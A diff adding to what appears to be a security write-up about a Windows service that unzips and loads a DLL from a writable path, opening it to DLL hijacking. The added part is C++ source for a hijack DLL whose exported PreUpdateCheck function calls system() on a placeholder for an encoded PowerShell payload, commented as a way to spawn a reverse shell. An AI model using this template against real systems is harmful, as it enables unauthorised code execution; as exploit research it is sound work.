@@ -402,7 +402,32 @@ So it looks like the service is trying to load a .zip file and a .dll file from 
 
 So after some research i see it basically loads a .zip from the path in the snippet above, it then unzips the file and placed the dll into the bin directory and loads it, so there is a potential for DLL hijacking here
 
+```python
+❯❯❯ cat settings_update.cpp 
+#include <windows.h>
+#include <stdlib.h>
 
+// This ensures the compiler exports the exact name without mangling
+extern "C" {
+    __declspec(dllexport) void PreUpdateCheck() {
+        // Your code execution payload goes here
+        // Example: Spawning a command or reverse shell
+        system("<powershell base64 encoded >");
+    }
+}
+
+// Optional but good practice for stability
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+        case DLL_PROCESS_ATTACH:
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+            break;
+    }
+    return TRUE;
+}
+```
 
 
 
